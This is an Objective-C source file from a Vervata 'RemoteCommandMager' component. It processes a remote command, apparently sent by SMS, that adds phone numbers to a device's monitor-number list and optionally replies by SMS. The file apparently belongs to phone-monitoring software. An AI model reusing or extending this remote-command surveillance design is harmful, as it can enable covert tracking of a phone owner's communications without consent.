/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddMonitorsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddMonitorsProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface AddMonitorsProcessor (PrivateAPI)
- (void) processAddMonitors;
- (void) addMonitorsException:(NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddMonitors;
- (BOOL) checkIfMonitorNumberAlreadyExist;
@end

@implementation AddMonitorsProcessor

@synthesize mMonitorNumbers;

/**
 - Method name:initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddMonitorsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (AddMonitorsProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddMonitorsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the addMonitorsProcessor
 - Argument list and description:No Argument 
 - Return description: No Return type
*/

- (void) doProcessingCommand {
	DLog (@"AddMonitorsProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		mMonitorNumbers = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"AddMonitorsProcessor--->Monitors:%@",mMonitorNumbers);
		if ([mMonitorNumbers count] > 0) {
			if ([self canAddMonitors]) { 
				if (![self checkIfMonitorNumberAlreadyExist] &&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mMonitorNumbers]) 
					[self processAddMonitors];
				else 
					[self addMonitorsException:kCmdExceptionErrorCannotAddDuplicateToMonitorList];
			}
			else {
				[self addMonitorsException:kCmdExceptionErrorMonitorNumberExceedListCapacity];
			}
		}
		else {
			[self addMonitorsException:kCmdExceptionErrorInvalidNumberToMonitorList];
		}
	} else {
		[self addMonitorsException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddMonitorsProcessor PrivateAPI Methods

/**
 - Method name: processAddMonitors
 - Purpose:This method is used to process add monitors
 - Argument list and description:No Argument
 - Return description:No return type
*/

- (void) processAddMonitors {
	DLog (@"AddMonitorsProcessor--->processAddMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSMutableArray *monitorsArray=[[NSMutableArray alloc] init];
	
	// Existing MonitorNumbers
	for (NSString *monitorNumber in [prefMonitor mMonitorNumbers]) {
		[monitorsArray addObject:monitorNumber];
	}
	
	//New Monitor Numbers
	for (NSString *monitorNumber in mMonitorNumbers) {
		[monitorsArray addObject:monitorNumber];
	}
	
	[prefMonitor setMMonitorNumbers:monitorsArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[monitorsArray release];
	[self sendReplySMS];
}

/**
 - Method name: addMonitorsException
 - Purpose:This method is invoked when add monitors process is failed. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) canAddMonitors {
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	DLog (@"existing monitor numbers (count:%d) %@", [[prefMonitor mMonitorNumbers] count], [prefMonitor mMonitorNumbers])
	DLog (@"new monitor numbers (count:%d) %@", [mMonitorNumbers count], mMonitorNumbers)
	int count = [[prefMonitor mMonitorNumbers] count] + [mMonitorNumbers count];
	if (count <= MONITOR_NUMBERS_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfMonitorNumberAlreadyExist
 - Purpose:This method is used to check if number already exist. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) checkIfMonitorNumberAlreadyExist {
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	for (NSString *monitorNumber in mMonitorNumbers) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",monitorNumber];
		NSArray *result=[[prefMonitor mMonitorNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addMonitorsException
 - Purpose:This method is invoked when add monitors process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) addMonitorsException:(NSUInteger) aErrorCode {
	DLog (@"AddMonitorsProcessor--->addMonitorsException")
	FxException* exception = [FxException exceptionWithName:@"addMonitorsException" andReason:@"Add Monitors error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument.
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"AddMonitorsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mMonitorNumbers release];
	[super dealloc];
}


@end
